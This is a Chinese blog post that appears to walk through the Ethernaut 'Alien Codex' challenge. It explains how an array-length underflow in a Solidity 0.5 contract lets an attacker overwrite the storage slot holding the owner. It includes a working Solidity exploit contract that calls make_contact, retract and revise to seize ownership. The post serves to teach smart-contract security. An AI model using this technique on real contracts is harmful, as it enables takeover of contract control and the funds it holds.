---
title: 'ethernaut.openzeppelin合约安全闯关-14'
date: 2022-12-16 12:42:15
tags:
- '区块链技术'
- '智能合约安全'
categories:
- '智能合约安全'
---

<!-- more -->

#### 第十九关 Alien 思路与POC

#### 目标: 更改合约的拥有者

##### 先看代码:

##### 可是似乎合约中并没有任何变量存储合约的部署者地址如何更改呢,但是注意看此合约继承了Ownable合约.实际上合约的部署者地址就存储在Ownable合约中的_owner变量中

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {
   //由于此合约继承了Ownable所以实际上address private _owner 和下面的这个contact变量就存在此合约的slot0中   
  bool public contact;   
  // solidity中字节数组如果没有指定元素数量的话默认空间长度就是对应合约存储空间2^256 -1
  bytes32[] public codex; 

  modifier contacted() {
    assert(contact);//判断contact变量是否为true,否则revert
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

//看起来我们没有直接的方式修改private _owner变量,但是注意看这个方法
  function retract() contacted public {
  /*
  如果字节数字为空的情况下再减去元素是不是就内存溢出了呢？
  那么现在如果想要修改slot0的数据是不是可以:
  codex[2^256-1(合约存储槽总长度) - keccak256(1) + 1(溢出的字节数组长度为-1所以此处+1读取下标0)] = data
  
 question1: 为什么字节数组长度可以为负? 
   其实是因为 EVM 不会验证一个数组的长度
 question2: 为什么此时字节数组能够根据下标位置对应修改slot0的数据?
   因为此时的数组是溢出的,此时的字节数组[下标]-1已经对应了整个合约的slot 2^256 - 1长度存储空间.
 question3: 为什么字节数组下标需要这么麻烦呢 不是直接 1 2 3 呢
   比如: 
   codex[ keccak256(1) ] = codex[0]
   codex[ keccak256(2) + 1] = codex[1]
  因为字符串或字节类型存放的数据大小在EVM编译器来看是不可预知的,无法在编译期直接确定其存储位置.因此 Solidity 在编译动态数字、字典数据时采用的是特定算法。
   */
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
//部分Ownable合约代码
abstract contract Ownable is Context {
    address private _owner;
```

##### poc思路:point_right:：所以我们需要做的就是使字节数组溢出,根据 make_contact ->  retract ->  revise 这个调用顺序

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract hackAlien {

 AlienCodex public alien   = AlienCodex(0x48a57CBA06d5AE4e82a13e39465fB82cAD0c4DC8);

//计算动态数组下标与slot0的对应位置
uint public index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;

 function byteOverflow(address  _owner) external   { 
     //满足条件
     alien.make_contact();
     //构造字节数组溢出
     alien.retract();
     //利用溢出修改slot0数据
     bytes32 owner = bytes32(uint256(uint160(_owner)));
     alien.revise(index , owner);

 }
}
```

```js
await contract.owner() //查看owner是否更改成功
```



#### 还要说的一点就是:这种字节数组直接.length -- 这种操作再solidity0.6.0开始就已经被禁止:shield: